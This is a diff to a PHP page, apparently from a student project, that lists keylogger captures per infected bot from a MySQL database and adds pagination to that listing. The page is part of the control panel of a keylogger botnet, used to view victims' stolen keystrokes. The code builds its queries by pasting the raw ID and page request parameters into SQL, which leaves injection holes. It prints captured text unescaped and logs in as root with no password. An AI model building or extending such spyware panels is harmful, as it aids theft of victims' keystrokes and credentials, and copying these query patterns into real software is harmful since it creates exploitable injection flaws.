@@ -1,5 +1,4 @@
 
-
 <?php
 $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
 if (mysqli_connect_errno()) exit;
@@ -7,11 +6,19 @@ if (mysqli_connect_errno()) exit;
 $header_display = "Keylogger Result";
 
 if (isset($_REQUEST['ID'])) {
-    $id = $_REQUEST['ID'];
-    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
-    if (mysqli_connect_errno()) exit;
-    $sql = "Select * from keylogger where IdBot = " . $id;
-    $rs = mysqli_query($db, $sql);
+  $id = $_REQUEST['ID'];
+  $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
+  if (mysqli_connect_errno()) exit;
+  $sql = "Select * from keylogger where IdBot = " . $id. " ORDER BY TimeStop DESC";
+
+  if (isset($_GET['page'])) {
+    $offset = $_GET['page'] * 15;
+    $sql = $sql . " LIMIT 15 OFFSET " . $offset;
+  } else {
+    $sql = $sql . " LIMIT 15 ";
+  }
+
+  $rs = mysqli_query($db, $sql);
 }
 
 // while ($stmt->fetch()) {
@@ -117,10 +124,10 @@ echo '
         width: 100%;
         min-height: 90%;
         padding: 30px;
-        display: flex;
+        display:flex;
         flex-direction: column;
-        align-items: center;
         justify-content: space-between;
+
       }
       .content_table {
         width: 100%;
@@ -197,6 +204,7 @@ echo '
           </ul>
         </div>
         <div class="content">
+           <div style="  height: 410px; ">
           <table class="content_table">
             <tr class="content_table-thead">
               <th class="content_table-th">Id </th>
@@ -220,11 +228,11 @@ if (isset($_REQUEST['ID'])) {
   while ($row = mysqli_fetch_array($rs)) {
     echo '<tr class="content_table-tr">';
     $detail = '<a class="link_detail" href="viewKeyloggerDetail.php?IdKeylogger=' . $row['IdKeylogger'] . '">detail</a>';
-    
+
     //    echo '<tr><td class="td"> ' . $row['IDNV'] . '</td><td class="td"> ' . $row['HoTen'] . '<td class="td"> ' . $row['DiaChi'] . '</td><td class="td"> ' . $row['IDPB'] . '</td></tr>';
-    echo '<td class="content_table-td">' . $row['IdKeylogger'] . '</td> <td class="content_table-td">' . $row['IdBot'] . '</td> <td class="content_table-td">' . $row['TimeStart'] . '</td> <td class="content_table-td">' . $row['TimeStop'] . '</td><td class="content_table-td">' . $row['KeyloggerResult'] . '</td>  <td class="content_table-td">'.$detail.'</td>';
-    
-    
+    echo '<td class="content_table-td">' . $row['IdKeylogger'] . '</td> <td class="content_table-td">' . $row['IdBot'] . '</td> <td class="content_table-td">' . $row['TimeStart'] . '</td> <td class="content_table-td">' . $row['TimeStop'] . '</td><td class="content_table-td">' . $row['KeyloggerResult'] . '</td>  <td class="content_table-td">' . $detail . '</td>';
+
+
     echo '</tr>';
   }
 }
@@ -239,15 +247,48 @@ if (isset($_REQUEST['ID'])) {
 //     echo '</tr>';
 // }
 echo '	
-          </table>
-          <button class="content_back" onclick="history.back()">Go Back</button>
+          </table></div>';
+
+if (isset($_GET['ID'])) {
+  $sql_pagination = 'SELECT COUNT(*) as NumRecord 
+    FROM keylogger where IdBot = ' . $_GET['ID'];
+
+  $rs_pagination = mysqli_query($db, $sql_pagination);
+
+  while ($row = mysqli_fetch_array($rs_pagination)) {
+    $NumRecord = $row["NumRecord"];
+  }
+
+  echo '<div style="margin:16px 0px;  display:flex; column-gap: 8px; flex-wrap: wrap;">';;
+
+  if ($NumRecord > 15) {
+
+
+    echo '<p style="color: #00ff00;">Page</p>';
+    for ($i = 0; $i <
+      $NumRecord / 15; $i++) {
+
+      if ($i != 0) {
+        $href = 'viewKeylogger.php?ID=' . $_GET['ID'] . "&page=" . $i;
+      } else {
+        $href = 'viewKeylogger.php?ID=' . $_GET['ID'];
+      }
+      $numPage = $i + 1;
+      $link = "<a style='text-decoration:underline; border: 1px solid #00ff00; padding:2px 4px; color: #00ff00;' href='" . $href . "'>" . $numPage . "</a>";
+      echo $link;
+    }
+  }
+  echo '</div>';
+}
+
+echo ' <button class="content_back" onclick="history.back()">Go Back</button>
 
         </div>
       </div>
-      ';
+    ';
 include_once("navigate.php");
 
-      echo'
+echo '
     </div>
   </body>
 </html>
